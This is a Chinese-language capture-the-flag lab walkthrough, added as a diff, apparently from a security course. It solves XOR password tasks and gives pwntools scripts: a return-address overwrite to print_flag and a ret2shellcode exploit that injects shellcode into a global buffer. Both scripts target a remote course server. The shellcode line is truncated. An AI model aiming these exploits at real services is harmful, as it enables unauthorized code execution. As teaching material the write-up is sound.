@@ -1,0 +1,91 @@
+流程:
+Task I-1:  輸入Code中 YOUSHALLNOTPASS
+Task I-2:  輸出random的數字: 1804289383
+	   將它與 0xDEADBEAF 作 xor 即解答 3039230920
+Task I-3:  密碼15碼,{pw1}與{pw2做xorkey 0xA}吻合即解密
+	   pw1: ;;;;;;;;;;;;;;; pw2: 111111111111111
+Task II-1: xxd ./time_will_stop_group0 解析檔案
+Task II-2: 用 objdump -M intel -d agent_hacker 找到要的function 位置
+	   這題中要找 print_flag()
+	   得到:
+000000000000099b <print_flag>:
+ 99b:	55                   	push   rbp
+ 99c:	48 89 e5             	mov    rbp,rsp
+ 99f:	b9 00 00 00 00       	mov    ecx,0x0
+ 9a4:	48 8d 15 3a 02 00 00 	lea    rdx,[rip+0x23a]        # be5 <_IO_stdin_used+0xc5>
+ 9ab:	48 8d 35 38 02 00 00 	lea    rsi,[rip+0x238]        # bea <_IO_stdin_used+0xca>
+ 9b2:	48 8d 3d 31 02 00 00 	lea    rdi,[rip+0x231]        # bea <_IO_stdin_used+0xca>
+ 9b9:	b8 00 00 00 00       	mov    eax,0x0
+ 9be:	e8 2d fe ff ff       	call   7f0 <execlp@plt>
+ 9c3:	90                   	nop
+ 9c4:	5d                   	pop    rbp
+ 9c5:	c3                   	ret
+
+	    記憶體在00099b開始
+編寫 pwn 腳本
+	#!/usr/bin/env python
+	# coding=utf-8
+	from pwn import *
+	#r = process('./agent_hacker')
+	r = remote('140.113.207.233',8850)
+	r.recvuntil('What is your name, agent: ')
+	targer_address = p64(0x00099b)
+	r.sendline(b'A' * 14 + targer_address)  # 第一個buff大小為0x14
+	r.interactive()
+
+Task II-3: 解析題目中有一個 Global variable (char,0x100) name
+                       一個 Local variable  (char, 0x10) buff
+           我們預想將shellcode存入至Global variable中，
+           然後藉由overflow "buff[0x10]"將位置指向 "name[0x100]"來呼叫shellcode
+           首先先找name的位置。
+           $ cp ret_shellcode.c test.c
+           
+      MET1:指派data到name[0x100]中
+           > char name[0x100]='\xaa\xbb\xcc';
+           編譯
+           $ gcc -z execstack test.c -o test -fno-stack-protector -no-pie
+           先大概抓檔案的data區塊:
+           $ readelf -S test | grep .data
+得到:
+cs2020@ubuntu:~/Desktop/6-ret_shellcode$ readelf -S test | grep .data
+  [16] .rodata           PROGBITS         00000000004006d0  000006d0
+  [25] .data             PROGBITS         0000000000601040  00001040
+
+           所以區塊在0x601040後，找有存剛剛data的位置
+           $ gdb test
+           gdb-peda$ find '\\xaa\\xbb\\xcc' 0x601040 +0x100
+           
+Searching for '\\xaa\\xbb\\xcc' in range: 0x601040 - 0x601140
+Found 1 results, display max 1 items:
+test : 0x601060 --> 0xccbbaa 
+      
+       MET2:或是直接在test中 printf("%p",name);
+       
+           得知name[0x100]位置為0x601060
+           
+           $ gdb ret_shellcode
+           $ r
+           What's your name? > anythingyouwant
+           What's your nickname? > "A"*30 讓他overflow
+           $ 觀察SIGSEGV報告中registers部分(gdb-peda$ info registers)
+           RSI: 0x7fffffffdd60
+           RSP: 0x7fffffffdd78
+           相差值就是buff的資料上限
+           可以做pwn解題工具了
+
+	#!/usr/bin/env python
+	# coding=utf-8
+    from pwn import *
+    name = 0x601060
+    code = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5$
+    buf = 0x7fffffffdd60
+    ret = 0x7fffffffdd78
+    r = remote('140.113.207.233', 8860)
+    # r = process('./ret_shellcode')
+    r.recvuntil('name:')
+    r.sendline(code)
+    r.recvuntil('nickname:')
+    payload = b'a'*(ret-buf) + p64(name)
+    r.sendline(payload)
+    r.interactive()
+    
